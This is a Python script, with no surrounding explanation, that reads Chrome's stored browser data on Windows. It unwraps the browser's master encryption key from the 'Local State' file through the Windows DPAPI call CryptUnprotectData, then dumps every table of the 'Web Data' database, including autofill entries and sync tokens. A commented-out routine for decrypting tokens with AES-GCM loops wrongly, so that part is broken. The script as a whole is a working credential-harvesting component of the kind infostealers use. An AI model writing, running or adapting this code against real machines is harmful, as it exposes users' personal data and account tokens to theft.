import os
import json
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES

db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data")


connection = sqlite3.connect(db)
cursor = connection.cursor()

def get_chrome_pass_master_key():
    db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Local State')
    f_obj = open(db,'rb')
    data = f_obj.read()
    f_obj.close()
    
    temp = json.loads(data.decode())    
    protected_enc_key = base64.b64decode(temp['os_crypt']['encrypted_key'])
    protected_enc_key = protected_enc_key[5:]
    unprotected_enc_key = win32crypt.CryptUnprotectData(protected_enc_key)
    unprotected_enc_key = unprotected_enc_key[1]
    return unprotected_enc_key

def parse_token_service(data):
    masterkey = get_chrome_pass_master_key()
    for line in data:
        buffer = data[1]
        iv = buffer[3:15]
        cipher = AES.new(masterkey, AES.MODE_GCM, iv)
        print(cipher.decrypt(buffer[15:]))


cursor.execute("SELECT * FROM sqlite_master WHERE type='table';")
tables  = cursor.fetchall()
for table in tables:
    print(table)
    query = "SELECT * FROM "+table[1]
    cursor.execute(query)
    """
    if table[1] == "token_service":
        parse_token_service(cursor.fetchall())
    else:
    """
    try:
        print(cursor.fetchall())
    except:
        print("[-] Failed to parse table -> ", table[1])
        continue
    print("-"*50)


"""
cursor.execute("SELECT sql from sqlite_schema where name='autofill';")
print(cursor.fetchall())
cursor.execute("SELECT * FROM autofill;")
print(cursor.fetchall())
cursor.execute("SELECT * FROM autofill_sync_metadata;")
print(cursor.fetchall())
"""